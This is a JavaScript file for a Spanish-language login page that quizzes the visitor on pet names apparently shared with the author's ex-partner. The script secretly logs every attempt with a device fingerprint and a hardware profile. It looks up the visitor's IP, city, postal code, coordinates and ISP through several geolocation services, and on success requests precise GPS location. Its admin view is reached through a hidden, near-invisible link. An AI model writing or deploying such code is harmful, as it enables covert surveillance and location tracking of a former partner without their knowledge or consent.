document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const errorMsg = document.getElementById('error-msg');
    
    // Configura aquí los apodos correctos
    const correctNickname1 = "more"; // Reemplaza "apodo1" por cómo llamabas a tu ex
    const correctNickname2 = "amor"; // Reemplaza "apodo2" por cómo te llamaba tu ex
    
    // Sistema mejorado de seguimiento de intentos de login
    function logLoginAttempt(nickname1, nickname2, success) {
        // Obtener registros existentes o inicializar un array vacío
        let loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        
        // Generar huella digital única para identificar dispositivos
        const fingerprint = generateDeviceFingerprint();
        
        // Recopilar información del dispositivo
        const deviceData = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            vendor: navigator.vendor,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            windowSize: `${window.innerWidth}x${window.innerHeight}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            colorDepth: window.screen.colorDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            touchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown'
        };
        
        // Crear el registro base del intento
        const loginAttempt = {
            timestamp: new Date().toISOString(),
            nickname1: nickname1,
            nickname2: nickname2,
            success: success,
            fingerprint: fingerprint,
            device: deviceData,
            location: 'pendiente'
        };
        
        // Añadir el intento a la lista
        loginAttempts.push(loginAttempt);
        
        // Limitar el número de registros (mantener solo los últimos 100)
        if (loginAttempts.length > 100) {
            loginAttempts = loginAttempts.slice(-100);
        }
        
        // Guardar de vuelta en localStorage
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
        
        // Crear un índice para este intento
        const attemptIndex = loginAttempts.length - 1;
        
        // Intentar obtener información de ubicación utilizando múltiples métodos
        fetchLocationData(attemptIndex, success);
    }
    
    // Generar una huella digital del dispositivo
    function generateDeviceFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            navigator.platform,
            `${window.screen.width}x${window.screen.height}`,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || '',
            navigator.deviceMemory || '',
            navigator.plugins ? navigator.plugins.length : '',
            navigator.doNotTrack || ''
        ];
        
        // Crear un hash simple de la cadena
        const str = components.join('|');
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash = hash & hash; // Convertir a entero de 32 bits
        }
        
        // Convertir a una cadena hexadecimal y devolver los últimos 10 caracteres
        return Math.abs(hash).toString(16).slice(-10);
    }
    
    // Función mejorada para obtener ubicación con múltiples fuentes
    function fetchLocationData(attemptIndex, success) {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        if (!loginAttempts[attemptIndex]) return;
        
        // Intentar con múltiples servicios de geolocalización IP
        // Usando Promise.race para usar el primer resultado que llegue
        Promise.race([
            // Servicio 1: ipapi.co
            fetch('https://ipapi.co/json/')
                .then(response => {
                    if (!response.ok) throw new Error('Error en ipapi.co');
                    return response.json();
                })
                .then(data => {
                    return {
                        source: 'ipapi.co',
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        postal: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        isp: data.org
                    };
                }),
                
            // Servicio 2: ipinfo.io
            fetch('https://ipinfo.io/json?token=YOUR_TOKEN') // Reemplaza con tu token gratuito de ipinfo.io
                .then(response => {
                    if (!response.ok) throw new Error('Error en ipinfo.io');
                    return response.json();
                })
                .then(data => {
                    const [lat, lng] = (data.loc || '0,0').split(',');
                    return {
                        source: 'ipinfo.io',
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        postal: data.postal,
                        latitude: parseFloat(lat),
                        longitude: parseFloat(lng),
                        isp: data.org
                    };
                }),
                
            // Servicio 3: geolocation-db.com (sin límite de peticiones)
            fetch('https://geolocation-db.com/json/')
                .then(response => {
                    if (!response.ok) throw new Error('Error en geolocation-db');
                    return response.json();
                })
                .then(data => {
                    return {
                        source: 'geolocation-db',
                        ip: data.IPv4,
                        city: data.city,
                        country: data.country_name,
                        latitude: data.latitude,
                        longitude: data.longitude
                    };
                }),
                
            // Timeout para evitar esperas demasiado largas
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
        ])
        .then(locationData => {
            // Actualizar el registro con los datos de IP
            updateLocationData(attemptIndex, locationData);
            
            // Si tenemos éxito, también intentamos obtener la geolocalización precisa
            if (success && navigator.geolocation) {
                // Solicitar ubicación precisa al usuario
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Si tenemos éxito, actualizar con la ubicación precisa
                        const preciseLocation = {
                            source: 'browser-geolocation',
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        // Añadir esta información a la ubicación existente
                        updatePreciseLocation(attemptIndex, preciseLocation);
                    },
                    function(error) {
                        console.log("Geolocalización denegada o no disponible:", error.message);
                        updateLocationError(attemptIndex, "Permiso denegado o error: " + error.message);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 10000, 
                        maximumAge: 0 
                    }
                );
            }
        })
        .catch(error => {
            // Si fallan todos los servicios, intentar con un servicio de backup
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                updateLocationData(attemptIndex, {
                    source: 'ipify.org',
                    ip: data.ip
                });
            })
            .catch(err => {
                updateLocationError(attemptIndex, "No se pudo obtener ubicación");
            });
        });
    }
    
    // Actualizar datos de ubicación en el registro
    function updateLocationData(index, locationData) {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        if (!loginAttempts[index]) return;
        
        loginAttempts[index].location = locationData;
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
    }
    
    // Añadir ubicación precisa al registro
    function updatePreciseLocation(index, preciseLocation) {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        if (!loginAttempts[index]) return;
        
        loginAttempts[index].preciseLocation = preciseLocation;
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
    }
    
    // Registrar error de ubicación
    function updateLocationError(index, errorMessage) {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        if (!loginAttempts[index]) return;
        
        if (!loginAttempts[index].location || loginAttempts[index].location === 'pendiente') {
            loginAttempts[index].location = { error: errorMessage };
        } else {
            loginAttempts[index].location.error = errorMessage;
        }
        
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
    }
    
    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const nickname1 = document.getElementById('nickname1').value.trim().toLowerCase();
        const nickname2 = document.getElementById('nickname2').value.trim().toLowerCase();
        
        if (nickname1 === correctNickname1 && nickname2 === correctNickname2) {
            // Registrar intento exitoso
            logLoginAttempt(nickname1, nickname2, true);
            
            // Establecer la sesión activa
            sessionStorage.setItem('loggedIn', 'true');
            sessionStorage.setItem('loginTime', new Date().toISOString());
            
            // Si las respuestas son correctas, redirigir a la página principal
            window.location.href = 'home.html';
        } else {
            // Registrar intento fallido
            logLoginAttempt(nickname1, nickname2, false);
            
            // Si las respuestas son incorrectas, mostrar mensaje de error
            errorMsg.style.display = 'block';
            errorMsg.textContent = 'Los apodos no son correctos. Inténtalo de nuevo.';
            
            // Añadir la clase de animación para resaltar el error
            errorMsg.classList.add('shake');
            
            // Eliminar la clase de animación después de que termine
            setTimeout(() => {
                errorMsg.classList.remove('shake');
            }, 500);
        }
    });
    
    // Limpiar mensaje de error cuando el usuario comienza a escribir de nuevo
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('input', function() {
            errorMsg.style.display = 'none';
        });
    });

    // Verificar si hay un código especial en la URL para acceso a admin
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('admin') === 'view') {
        const adminLink = document.createElement('a');
        adminLink.href = 'admin.html';
        adminLink.textContent = '👁️';
        adminLink.style.position = 'fixed';
        adminLink.style.bottom = '10px';
        adminLink.style.right = '10px';
        adminLink.style.color = 'rgba(255,255,255,0.1)';
        adminLink.style.textDecoration = 'none';
        adminLink.style.fontSize = '20px';
        document.body.appendChild(adminLink);
    }
});
